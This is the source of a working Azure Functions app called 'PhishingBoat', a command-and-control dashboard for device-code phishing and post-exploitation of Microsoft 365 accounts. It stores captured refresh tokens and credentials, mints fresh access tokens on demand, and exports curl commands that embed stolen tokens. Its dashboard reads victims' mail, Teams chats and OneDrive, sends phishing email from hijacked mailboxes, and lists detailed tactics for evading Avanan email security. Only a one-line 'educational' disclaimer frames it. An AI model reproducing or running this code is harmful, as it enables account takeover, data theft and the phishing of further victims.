/**
 * C2 Dashboard — Real-time operator dashboard with session management
 *
 * Serves a BeEF-style command-and-control panel for post-exploitation.
 * Captured identities appear as "hooked sessions" — operators click buttons
 * to perform Graph API actions (read emails, Teams, OneDrive, etc.) without
 * leaving the dashboard.
 *
 * Architecture: "Token vending machine" — the function app stores refresh
 * tokens and issues fresh access tokens on demand. The operator's browser
 * makes Graph API calls directly (Microsoft Graph allows cross-origin
 * Bearer requests).
 *
 * Routes:
 *   GET  /dashboard                — Serves the HTML C2 dashboard
 *   GET  /notifications            — Returns notifications as JSON
 *   GET  /sessions                 — List hooked sessions
 *   GET  /sessions/{id}            — Full session detail
 *   POST /sessions/{id}/token      — Token vending: refresh → access token
 *   POST /sessions/{id}/delete     — Remove a session
 *   GET  /sessions/{id}/export     — Export session for offline use
 *   GET  /sessions/{id}/export-html — Downloadable session player HTML
 *
 * This code is provided for educational/research purposes only.
 */

const { app } = require("@azure/functions");
const crypto = require("crypto");

// Authentication
const DASHBOARD_KEY = process.env.DASHBOARD_KEY || "";

function verifyDashboardKey(request) {
  if (!DASHBOARD_KEY) return false;
  const authHeader = request.headers.get("authorization") || "";
  const bearerToken = authHeader.startsWith("Bearer ") ? authHeader.slice(7) : "";
  if (bearerToken && safeCompare(bearerToken, DASHBOARD_KEY)) return true;
  const url = new URL(request.url);
  const keyParam = url.searchParams.get("key") || "";
  if (keyParam && safeCompare(keyParam, DASHBOARD_KEY)) return true;
  return false;
}

function safeCompare(a, b) {
  if (a.length !== b.length) return false;
  return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
}

function unauthorized() { return new Response("Unauthorized", { status: 401 }); }

// ── In-memory stores ────────────────────────────────────────────────
const notifications = [];
const MAX_NOTIFICATIONS = 500;
const sessions = new Map();

function pushNotification(type, html, meta = {}) {
  const entry = {
    id: Date.now() + "-" + Math.random().toString(36).substring(2, 8),
    timestamp: Date.now(),
    type,
    html,
    meta,
  };
  notifications.push(entry);
  if (notifications.length > MAX_NOTIFICATIONS) {
    notifications.splice(0, notifications.length - MAX_NOTIFICATIONS);
  }
  return entry;
}

module.exports = { pushNotification, notifications, sessions };

// ── Token endpoint constants ────────────────────────────────────────
const TOKEN_ENDPOINT_DEFAULT = "https://login.microsoftonline.com/common/oauth2/v2.0/token";

function getTokenEndpoint(session) {
  if (session?.tokenEndpoint) return session.tokenEndpoint;
  if (session?.user?.tid && session.user.tid !== "unknown") {
    return `https://login.microsoftonline.com/${session.user.tid}/oauth2/v2.0/token`;
  }
  return TOKEN_ENDPOINT_DEFAULT;
}
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

const RESOURCE_TO_SCOPE = {
  "https://graph.microsoft.com/": "https://graph.microsoft.com/.default",
  "https://outlook.office365.com/": "https://outlook.office365.com/.default",
};

async function refreshForResource(refreshToken, clientId, resource, session) {
  const endpoint = getTokenEndpoint(session);
  const scope = RESOURCE_TO_SCOPE[resource] || resource.replace(/\/$/, "") + "/.default";
  const resp = await fetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA },
    body: new URLSearchParams({
      client_id: clientId,
      grant_type: "refresh_token",
      refresh_token: refreshToken,
      scope: scope,
    }).toString(),
  });
  return resp.json();
}

// ── Routes ──────────────────────────────────────────────────────────

// GET /dashboard
app.http("dashboard", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "dashboard",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const url = new URL(request.url);
    const key = url.searchParams.get("key") || "";
    return new Response(getDashboardHTML(key), {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8" },
    });
  },
});

// GET /notifications
app.http("notifications-get", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "notifications",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const url = new URL(request.url);
    const since = parseInt(url.searchParams.get("since") || "0", 10);
    const filtered = since ? notifications.filter(n => n.timestamp > since) : notifications;
    return new Response(JSON.stringify(filtered), {
      status: 200,
      headers: { "Content-Type": "application/json", "Cache-Control": "no-cache" },
    });
  },
});

// GET /sessions — list hooked sessions
app.http("c2-sessions-list", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "sessions",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const list = Array.from(sessions.values()).map(s => ({
      id: s.id,
      capturedAt: s.capturedAt,
      status: s.status,
      user: s.user,
      resourceCount: Object.values(s.resources).filter(r => r.accessible).length,
      hasRefreshToken: !!s.refreshToken,
      hasCredentials: !!(s.credentials?.username),
    })).sort((a, b) => b.capturedAt - a.capturedAt);
    return new Response(JSON.stringify(list), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  },
});

// GET /sessions/{id} — full session detail
app.http("c2-sessions-detail", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "sessions/{id}",
  handler: async (request, context) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const id = request.params.id;
    const s = sessions.get(id);
    if (!s) return new Response("Not found", { status: 404 });
    return new Response(JSON.stringify({
      id: s.id,
      capturedAt: s.capturedAt,
      lastTokenRefresh: s.lastTokenRefresh,
      status: s.status,
      user: s.user,
      resources: s.resources,
      recon: s.recon,
      refreshToken: s.refreshToken || null,
      credentials: s.credentials,
      cookieArray: s.cookieArray || [],
    }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  },
});

// POST /sessions/{id}/token — token vending machine
app.http("c2-sessions-token", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "sessions/{id}/token",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const id = request.params.id;
    const s = sessions.get(id);
    if (!s) return new Response("Not found", { status: 404 });
    if (!s.refreshToken) return new Response(JSON.stringify({ error: "no_refresh_token" }), { status: 410 });

    const body = await request.json();
    const resource = body.resource || "https://graph.microsoft.com/";

    try {
      const tokens = await refreshForResource(s.refreshToken, s.clientId, resource, s);
      if (tokens.access_token) {
        s.lastTokenRefresh = Date.now();
        if (tokens.refresh_token) s.refreshToken = tokens.refresh_token;
        return new Response(JSON.stringify({
          access_token: tokens.access_token,
          expires_in: tokens.expires_in,
        }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        });
      }
      // Token revoked or expired
      s.status = "expired";
      return new Response(JSON.stringify({ error: tokens.error, description: tokens.error_description }), { status: 410 });
    } catch (err) {
      return new Response(JSON.stringify({ error: err.message }), { status: 500 });
    }
  },
});

// POST /sessions/{id}/delete
app.http("c2-sessions-delete", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "sessions/{id}/delete",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    sessions.delete(request.params.id);
    return new Response(null, { status: 204 });
  },
});

// GET /sessions/{id}/export — JSON export for offline use
app.http("c2-sessions-export", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "sessions/{id}/export",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const s = sessions.get(request.params.id);
    if (!s) return new Response("Not found", { status: 404 });
    const exp = {
      user: s.user,
      credentials: s.credentials,
      refreshToken: s.refreshToken,
      clientId: s.clientId,
      tokenEndpoint: getTokenEndpoint(s),
      cookieArray: s.cookieArray,
      resources: s.resources,
      recon: s.recon,
      curlCommands: {
        getGraphToken: `curl -s -X POST ${getTokenEndpoint(s)} -d "client_id=${s.clientId}&grant_type=refresh_token&refresh_token=${s.refreshToken}&scope=https://graph.microsoft.com/.default"`,
        getOutlookToken: `curl -s -X POST ${getTokenEndpoint(s)} -d "client_id=${s.clientId}&grant_type=refresh_token&refresh_token=${s.refreshToken}&scope=https://outlook.office365.com/.default"`,
        readEmails: `curl -s -H "Authorization: Bearer ACCESS_TOKEN" "https://graph.microsoft.com/v1.0/me/messages?\\$top=25"`,
        readTeams: `curl -s -H "Authorization: Bearer ACCESS_TOKEN" "https://graph.microsoft.com/v1.0/me/chats"`,
        readOneDrive: `curl -s -H "Authorization: Bearer ACCESS_TOKEN" "https://graph.microsoft.com/v1.0/me/drive/root/children"`,
      },
    };
    return new Response(JSON.stringify(exp, null, 2), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  },
});

// GET /sessions/{id}/export-html — downloadable session player
app.http("c2-sessions-html", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "sessions/{id}/export-html",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();
    const s = sessions.get(request.params.id);
    if (!s) return new Response("Not found", { status: 404 });
    const html = getSessionPlayerHTML(s);
    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Content-Disposition": `attachment; filename="session-${s.user.upn.replace(/[^a-zA-Z0-9]/g, "_")}.html"`,
      },
    });
  },
});

// ── Dashboard HTML ──────────────────────────────────────────────────

function getDashboardHTML(dashboardKey) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PhishingBoat</title>
<style>
:root {
  --bg: #0d1117; --surface: #161b22; --surface2: #1c2333; --border: #30363d;
  --text: #e6edf3; --text-dim: #8b949e; --accent: #58a6ff; --red: #f85149;
  --orange: #d29922; --green: #3fb950; --purple: #bc8cff; --cyan: #39d2c0;
}
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'SF Mono','Cascadia Code','Fira Code','Consolas',monospace; background:var(--bg); color:var(--text); height:100vh; display:flex; flex-direction:column; overflow:hidden; }
header { background:var(--surface); border-bottom:1px solid var(--border); padding:10px 20px; display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
header h1 { font-size:16px; font-weight:600; color:var(--accent); letter-spacing:1px; }
.hdr-right { display:flex; align-items:center; gap:12px; font-size:16px; color:var(--text-dim); }
.status-dot { width:8px; height:8px; border-radius:50%; background:var(--green); animation:pulse 2s ease-in-out infinite; display:inline-block; }
.status-dot.off { background:var(--red); animation:none; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
.main { display:flex; flex:1; overflow:hidden; }

/* Sidebar */
.sidebar { width:280px; background:var(--surface); border-right:1px solid var(--border); display:flex; flex-direction:column; flex-shrink:0; }
.sidebar-hdr { padding:10px 14px; border-bottom:1px solid var(--border); font-size:16px; font-weight:600; color:var(--text-dim); text-transform:uppercase; letter-spacing:.5px; display:flex; justify-content:space-between; align-items:center; }
.sidebar-hdr .badge { background:var(--accent); color:var(--bg); font-size:16px; font-weight:700; padding:1px 7px; border-radius:8px; }
.session-list { flex:1; overflow-y:auto; }
.session-card { padding:10px 14px; border-bottom:1px solid var(--border); cursor:pointer; transition:background .15s; }
.session-card:hover { background:var(--surface2); }
.session-card.active { background:var(--surface2); border-left:3px solid var(--accent); }
.session-card .upn { font-size:18px; font-weight:600; color:var(--text); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.session-card .meta { font-size:16px; color:var(--text-dim); margin-top:3px; display:flex; gap:8px; align-items:center; }
.session-card .dot { width:6px; height:6px; border-radius:50%; display:inline-block; }
.session-card .dot.active { background:var(--green); }
.session-card .dot.pending { background:var(--orange, #d29922); }
.session-card .dot.expired { background:var(--red); }
.session-card .res-badges { display:flex; gap:3px; margin-top:4px; }
.session-card .res-badge { font-size:18px; padding:1px 5px; border-radius:3px; background:rgba(63,185,80,.12); color:var(--green); }
.no-sessions { padding:30px 14px; text-align:center; color:var(--text-dim); font-size:18px; }

/* Content area */
.content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
.tabs { display:flex; background:var(--surface); border-bottom:1px solid var(--border); flex-shrink:0; }
.tab { padding:8px 18px; font-size:16px; font-family:inherit; color:var(--text-dim); background:none; border:none; border-bottom:2px solid transparent; cursor:pointer; transition:all .15s; }
.tab:hover { color:var(--text); }
.tab.active { color:var(--accent); border-bottom-color:var(--accent); }
.tab .tab-badge { background:var(--red); color:#fff; font-size:18px; padding:0 5px; border-radius:6px; margin-left:5px; }
.tab-body { flex:1; overflow-y:auto; padding:16px 20px; }
.tab-body.hidden { display:none; }

/* Token bar */
.token-bar { display:flex; align-items:center; gap:10px; padding:8px 12px; background:var(--surface); border:1px solid var(--border); border-radius:4px; margin-bottom:12px; font-size:16px; }
.token-indicator { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
.token-indicator.valid { background:var(--green); }
.token-indicator.expiring { background:var(--orange); animation:pulse 1.5s ease-in-out infinite; }
.token-indicator.expired { background:var(--red); }
.token-indicator.none { background:var(--text-dim); }
#token-status { flex:1; color:var(--text-dim); }
.token-refresh-btn { font-size:16px; font-family:inherit; padding:3px 10px; border:1px solid var(--border); background:none; color:var(--text-dim); border-radius:3px; cursor:pointer; }
.token-refresh-btn:hover { border-color:var(--accent); color:var(--accent); }

/* Graph Explorer */
.explorer-bar { display:flex; gap:6px; margin-bottom:8px; }
.explorer-bar select { background:var(--surface); border:1px solid var(--border); color:var(--text); padding:6px 8px; font-family:inherit; font-size:16px; border-radius:4px; width:80px; }
.explorer-bar input { flex:1; background:var(--surface); border:1px solid var(--border); color:var(--text); padding:6px 10px; font-family:inherit; font-size:16px; border-radius:4px; }
.explorer-bar input:focus { border-color:var(--accent); outline:none; }
.explorer-bar button { background:var(--accent); border:1px solid var(--accent); color:var(--bg); padding:6px 16px; font-family:inherit; font-size:16px; font-weight:600; border-radius:4px; cursor:pointer; }
.explorer-bar button:hover { opacity:.85; }
.explorer-presets { display:flex; gap:4px; flex-wrap:wrap; margin-bottom:8px; }
.explorer-presets button { font-size:16px; font-family:inherit; padding:3px 10px; border:1px solid var(--border); background:none; color:var(--text-dim); border-radius:3px; cursor:pointer; }
.explorer-presets button:hover { border-color:var(--accent); color:var(--accent); }
.explorer-status { font-size:16px; color:var(--text-dim); margin-bottom:6px; }

/* Actions tab */
.action-cats { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:14px; }
.action-cat { font-size:16px; font-family:inherit; padding:4px 12px; border-radius:4px; border:1px solid var(--border); background:none; color:var(--text-dim); cursor:pointer; transition:all .15s; }
.action-cat:hover { border-color:var(--text-dim); color:var(--text); }
.action-cat.active { border-color:var(--accent); color:var(--accent); background:rgba(88,166,255,.08); }
.action-grid { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:16px; }
.action-btn { font-size:16px; font-family:inherit; padding:6px 14px; border-radius:4px; border:1px solid var(--border); background:var(--surface); color:var(--text); cursor:pointer; transition:all .15s; }
.action-btn:hover { border-color:var(--accent); color:var(--accent); }
.action-btn.loading { opacity:.5; pointer-events:none; }
.no-session-msg { text-align:center; padding:60px 20px; color:var(--text-dim); font-size:16px; }

/* Results */
.results-area { margin-top:8px; }
.result-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; }
.result-header .path { font-size:16px; color:var(--accent); }
.result-header button { font-size:16px; font-family:inherit; padding:3px 8px; border:1px solid var(--border); background:none; color:var(--text-dim); border-radius:3px; cursor:pointer; }
.result-header button:hover { color:var(--text); border-color:var(--text-dim); }
.result-json { background:var(--surface); border:1px solid var(--border); border-radius:4px; padding:12px; font-size:18px; line-height:1.5; overflow-x:auto; max-height:60vh; overflow-y:auto; white-space:pre-wrap; word-break:break-word; }
.result-table { width:100%; border-collapse:collapse; font-size:18px; }
.result-table th { text-align:left; padding:6px 10px; background:var(--surface); border-bottom:1px solid var(--border); color:var(--accent); font-weight:600; font-size:16px; }
.result-table td { padding:6px 10px; border-bottom:1px solid var(--border); }
.result-table tr:hover { background:var(--surface2); }
.result-table tr.clickable { cursor:pointer; }
.result-table tr.clickable:hover td { color:var(--accent); }
.breadcrumb { font-size:16px; color:var(--text-dim); margin-bottom:8px; }
.breadcrumb span { cursor:pointer; color:var(--accent); }
.breadcrumb span:hover { text-decoration:underline; }

/* Feed tab (reuses existing styles) */
.card { background:var(--surface); border:1px solid var(--border); border-radius:6px; overflow:hidden; animation:fadeIn .3s ease; margin-bottom:6px; }
@keyframes fadeIn { from{opacity:0;transform:translateY(-8px)} to{opacity:1;transform:translateY(0)} }
.card-header { display:flex; align-items:center; gap:8px; padding:8px 12px; border-bottom:1px solid var(--border); font-size:16px; }
.card-type { padding:2px 7px; border-radius:3px; font-size:18px; font-weight:600; text-transform:uppercase; letter-spacing:.5px; }
.type-credentials{background:rgba(248,81,73,.15);color:var(--red)} .type-mfa{background:rgba(210,153,34,.15);color:var(--orange)} .type-session_cookies{background:rgba(188,140,255,.15);color:var(--purple)} .type-auth_code{background:rgba(57,210,192,.15);color:var(--cyan)} .type-tokens{background:rgba(63,185,80,.15);color:var(--green)} .type-execution{background:rgba(88,166,255,.15);color:var(--accent)} .type-info{background:rgba(139,148,158,.12);color:var(--text-dim)} .type-error{background:rgba(248,81,73,.15);color:var(--red)}
.card-time { margin-left:auto; color:var(--text-dim); }
.card-body { padding:10px 12px; font-size:18px; line-height:1.5; word-break:break-word; }
.card-body b { color:var(--accent); font-weight:600; }
.card-body code { background:rgba(110,118,129,.15); padding:2px 5px; border-radius:3px; font-size:16px; font-family:inherit; word-break:break-all; }
.filter-bar { display:flex; gap:4px; flex-wrap:wrap; margin-bottom:10px; }
.filter-chip { font-size:16px; font-family:inherit; padding:2px 8px; border-radius:10px; border:1px solid var(--border); background:none; color:var(--text-dim); cursor:pointer; }
.filter-chip.active { border-color:var(--accent); color:var(--accent); }

/* Session detail panel */
.session-detail { background:var(--surface); border:1px solid var(--border); border-radius:4px; padding:12px; margin-bottom:14px; font-size:18px; line-height:1.6; }
.session-detail b { color:var(--accent); }

/* Stealth mode */
@keyframes stealthGlow {
  0%,100% { box-shadow: 0 0 4px var(--green), inset 0 0 2px rgba(63,185,80,.15); border-color: var(--green); }
  50% { box-shadow: 0 0 12px var(--green), 0 0 24px rgba(63,185,80,.2), inset 0 0 4px rgba(63,185,80,.1); border-color: #5ae87a; }
}
@keyframes stealthTrace {
  0% { background-position: 200% 0; }
  100% { background-position: -200% 0; }
}
.stealth-btn {
  font-size:13px; font-family:inherit; font-weight:600; letter-spacing:1px; text-transform:uppercase;
  padding:6px 18px; border-radius:4px; border:1.5px solid var(--border); background:var(--surface);
  color:var(--text-dim); cursor:pointer; transition:all .3s ease; position:relative; overflow:hidden;
}
.stealth-btn::before {
  content:""; position:absolute; inset:-1.5px; border-radius:5px; padding:1.5px;
  background:linear-gradient(90deg,transparent 0%,transparent 40%,var(--green) 50%,transparent 60%,transparent 100%);
  background-size:200% 100%; -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);
  -webkit-mask-composite:xor; mask-composite:exclude; opacity:0; transition:opacity .3s ease;
}
.stealth-btn.active {
  color:var(--green); border-color:var(--green); background:rgba(63,185,80,.06);
  animation:stealthGlow 2.5s ease-in-out infinite;
}
.stealth-btn.active::before { opacity:1; animation:stealthTrace 2s linear infinite; }
.stealth-panel {
  margin-top:8px; padding:10px 12px; background:rgba(63,185,80,.04); border:1px solid rgba(63,185,80,.15);
  border-radius:4px; font-size:12px; line-height:1.7; display:none;
}
.stealth-panel.active { display:block; }
.stealth-panel .rule { display:flex; align-items:flex-start; gap:6px; margin-bottom:2px; }
.stealth-panel .rule .check { color:var(--green); flex-shrink:0; font-size:11px; margin-top:1px; }
.stealth-panel .rule .label { color:var(--text-dim); }
.stealth-panel .cat-label { font-size:11px; font-weight:600; color:var(--green); text-transform:uppercase; letter-spacing:.5px; margin:6px 0 2px; }
.stealth-panel .cat-label:first-child { margin-top:0; }

/* Scrollbar */
::-webkit-scrollbar{width:6px} ::-webkit-scrollbar-track{background:transparent} ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px} ::-webkit-scrollbar-thumb:hover{background:var(--text-dim)}
</style>
</head>
<body>

<header>
  <h1>PHISHINGBOAT</h1>
  <div class="hdr-right">
    <span class="status-dot" id="status-dot"></span>
    <span id="status-text">Connecting...</span>
  </div>
</header>

<div class="main">
  <div class="sidebar">
    <div class="sidebar-hdr">Sessions <span class="badge" id="session-count">0</span></div>
    <div class="no-sessions" id="no-sessions">No hooked sessions yet.<br><br><span style="color:var(--accent);cursor:pointer" onclick="switchTab('devicecode',document.querySelectorAll('.tab')[2])">Start a Device Code flow &rarr;</span></div>
    <div class="session-list" id="session-list"></div>
  </div>

  <div class="content">
    <div class="tabs">
      <button class="tab active" onclick="switchTab('actions',this)">Actions</button>
      <button class="tab" onclick="switchTab('results',this)">Results</button>
      <button class="tab" onclick="switchTab('devicecode',this)">Device Code</button>
      <button class="tab" onclick="switchTab('feed',this)">Feed<span class="tab-badge" id="feed-badge" style="display:none">0</span></button>
      <button class="tab" onclick="switchTab('compose',this)">Compose</button>
    </div>

    <div class="tab-body" id="tab-actions">
      <div class="no-session-msg" id="no-session-selected">Select a session from the sidebar to begin.<br><br><span style="color:var(--accent);cursor:pointer" onclick="switchTab('devicecode',document.querySelectorAll('.tab')[2])">Or start a Device Code flow &rarr;</span></div>
      <div id="action-panel" style="display:none">
        <div class="session-detail" id="session-info"></div>
        <div class="token-bar" id="token-bar">
          <span class="token-indicator" id="token-indicator"></span>
          <span id="token-status">No token</span>
          <button class="token-refresh-btn" onclick="refreshSessionToken()">Refresh Token</button>
        </div>
        <div class="action-cats" id="action-cats"></div>
        <div id="cat-status" style="display:none;padding:6px 10px;margin-bottom:10px;border-radius:4px;font-size:13px;background:var(--surface2);border:1px solid var(--border);display:none"></div>
        <div class="action-grid" id="action-grid"></div>
        <div id="graph-explorer" style="display:none">
          <div class="explorer-bar">
            <select id="graph-method"><option>GET</option><option>POST</option><option>PATCH</option><option>DELETE</option></select>
            <input id="graph-endpoint" value="/v1.0/me" placeholder="/v1.0/me/messages?$top=10" onkeydown="if(event.key==='Enter')sendGraphExplorer()">
            <button onclick="sendGraphExplorer()">Send</button>
          </div>
          <div class="explorer-presets">
            <button onclick="graphPreset('/v1.0/me')">Profile</button>
            <button onclick="graphPreset('/v1.0/me/messages?$top=10&$select=subject,from,receivedDateTime,bodyPreview')">Emails</button>
            <button onclick="graphPreset('/v1.0/me/chats?$top=20&$expand=members')">Chats</button>
            <button onclick="graphPreset('/v1.0/me/joinedTeams')">Teams</button>
            <button onclick="graphPreset('/v1.0/me/drive/root/children')">OneDrive</button>
            <button onclick="graphPreset('/v1.0/me/calendarView?startDateTime='+new Date().toISOString()+'&endDateTime='+new Date(Date.now()+7*864e5).toISOString())">Calendar</button>
            <button onclick="graphPreset('/v1.0/organization')">Org</button>
            <button onclick="graphPreset('/v1.0/me/memberOf')">Roles</button>
            <button onclick="graphPreset('/v1.0/me/authentication/methods')">Auth Methods</button>
          </div>
          <div class="explorer-status" id="explorer-status"></div>
        </div>
      </div>
    </div>

    <div class="tab-body hidden" id="tab-results">
      <div class="results-area" id="results-area">
        <div class="no-session-msg">Run an action to see results here.</div>
      </div>
    </div>

    <div class="tab-body hidden" id="tab-devicecode">
      <div class="session-detail" style="margin-bottom:12px">
        <b>Device Code Phishing</b> — Generate a user code, deliver it to the target, and wait for them to authenticate at <code>microsoft.com/devicelogin</code>.
      </div>
      <div style="display:flex;gap:6px;margin-bottom:12px;align-items:flex-end;flex-wrap:wrap">
        <div style="flex:1;min-width:200px">
          <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:3px">Scope</label>
          <input id="dc-scope" value="openid profile offline_access https://graph.microsoft.com/.default" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
        </div>
        <div>
          <label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:3px">Client App</label>
          <select id="dc-client" style="width:280px;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px">
            <option value="d3590ed6-52b3-4102-aeff-aad2292ab01c">Microsoft Office &#10003;</option>
            <option value="04b07795-8ddb-461a-bbee-02f9e1bf7b46">Azure CLI &#10003;</option>
            <option value="1950a258-227b-4e31-a9cf-717495945fc2">Azure PowerShell &#10003;</option>
            <option value="29d9ed98-a469-4536-ade2-f981bc1d605e">MS Auth Broker &#10003;</option>
            <option value="27922004-5251-4030-b22d-91ecd9a37ea4">Outlook Mobile &#10003;</option>
            <option value="ab9b8c07-8f02-4f72-87fa-80105867a763">OneDrive SyncEngine</option>
            <option value="1fec8e78-bce4-4aaf-ab1b-5451cc387264">Microsoft Teams (may fail)</option>
            <option value="4e291c71-d680-4d0e-9640-0a3358e31177">PowerApps</option>
            <option value="custom">Custom...</option>
          </select>
        </div>
        <button onclick="startDeviceCode()" style="background:var(--accent);border:1px solid var(--accent);color:var(--bg);padding:6px 18px;font-family:inherit;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;white-space:nowrap">Start Flow</button>
      </div>
      <div id="dc-active" style="margin-bottom:14px"></div>
      <div id="dc-completed"></div>
    </div>

    <div class="tab-body hidden" id="tab-feed">
      <div class="filter-bar">
        <button class="filter-chip active" onclick="setFilter('all',this)">All</button>
        <button class="filter-chip" onclick="setFilter('credentials',this)">Credentials</button>
        <button class="filter-chip" onclick="setFilter('mfa',this)">MFA</button>
        <button class="filter-chip" onclick="setFilter('session_cookies',this)">Cookies</button>
        <button class="filter-chip" onclick="setFilter('tokens',this)">Tokens</button>
        <button class="filter-chip" onclick="setFilter('execution',this)">Execution</button>
        <button class="filter-chip" onclick="setFilter('error',this)">Errors</button>
        <span style="margin-left:auto;display:flex;gap:4px">
          <button onclick="exportFeedJSON()" style="font-size:16px;font-family:inherit;padding:3px 8px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:3px;cursor:pointer">Export JSON</button>
          <button onclick="exportFeedCSV()" style="font-size:16px;font-family:inherit;padding:3px 8px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:3px;cursor:pointer">Export CSV</button>
        </span>
      </div>
      <div id="feed"></div>
    </div>

    <div class="tab-body hidden" id="tab-compose">
      <div class="session-detail" style="margin-bottom:12px">
        <div style="display:flex;align-items:center;justify-content:space-between">
          <div>
            <b>Compose Phishing Email</b> — Send from a compromised session's mailbox. Select a template, phish mode, and deliver.
            <div style="color:var(--orange);font-size:16px;margin-top:4px">Requires a hooked session with Mail.Send permission</div>
          </div>
          <button class="stealth-btn" id="stealth-btn" onclick="toggleStealth()" title="Activate Avanan evasion OPSEC">&#9681; STEALTH</button>
        </div>
        <div class="stealth-panel" id="stealth-panel">
          <div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">
            <span style="color:var(--green);font-size:13px;font-weight:600">&#9681; STEALTH MODE ACTIVE</span>
            <span style="color:var(--text-dim);font-size:11px">— Avanan / Check Point Harmony Email evasion</span>
          </div>
          <div style="font-size:11px;color:var(--text-dim);margin-bottom:8px;line-height:1.5;padding:6px 8px;background:rgba(88,166,255,.04);border-radius:3px">
            Avanan connects via <b style="color:var(--text)">Graph API</b> (not MX), scanning post-acceptance / pre-delivery. It layers <b style="color:var(--text)">SmartPhish AI</b> (300+ indicators, 13-month sender baseline) on top of <b style="color:var(--text)">ThreatCloud</b> URL/IP reputation and <b style="color:var(--text)">SandBlast</b> attachment/URL detonation. The sender will never see an SMTP rejection — quarantined mail silently vanishes. Internal-to-internal mail from a baselined sender has the strongest trust signal.
          </div>
          <div class="cat-label">URL &amp; Link OPSEC</div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Prefer Device Code / OAuth consent URLs — they point to <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">microsoft.com/devicelogin</code> or <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">login.microsoftonline.com</code>, which Avanan trusts</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">No URL shorteners (bit.ly, lnkd.in) — Avanan ThreatCloud flags these for sandbox detonation</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Aged domains only (>30 days) — Avanan's NRD engine has a configurable minimum domain age workflow</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Chain redirects through high-rep domains (SharePoint, OneDrive, Google Docs) — multi-hop chains >3 hops can exhaust Avanan's redirect-following budget</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Avanan rewrites links to <code style="font-size:11px;background:rgba(110,118,129,.15);padding:1px 3px;border-radius:2px">url.avanan.click</code> — legitimate MS OAuth URLs may bypass rewriting</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Click-time Link Analyzer detonates URLs in SandBlast browser sandbox — geofence payload to target org's IP range and serve benign content to headless UAs</span></div>
          <div class="cat-label">Sender &amp; Domain OPSEC</div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Send from compromised session (internal) — inherits 13-month sender reputation baseline, bypasses SPF/DKIM/DMARC checks</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Match display name to sender's real identity — SmartPhish flags display name / email mismatch (nickname impersonation detection)</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">No cousin/typosquat domains — AI flags domain similarity (rn→m, 0→O substitutions)</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">Reply to existing thread if possible — conversation context boosts SmartPhish trust score</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">If external: ensure SPF + DKIM + DMARC pass (DMARC p=none is sufficient for alignment)</span></div>
          <div class="cat-label">Content &amp; NLP OPSEC</div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">SmartPhish uses 300+ NLP indicators — avoid urgency phrases: "immediately", "urgent", "expire", "suspend", "account locked"</span></div>
          <div class="rule"><span class="check">&#10003;</span><span class="label">No password/credential solicitation language — falls in high-confidence "Phishing" tier (vs lower "Suspected Phishing")</span></div>
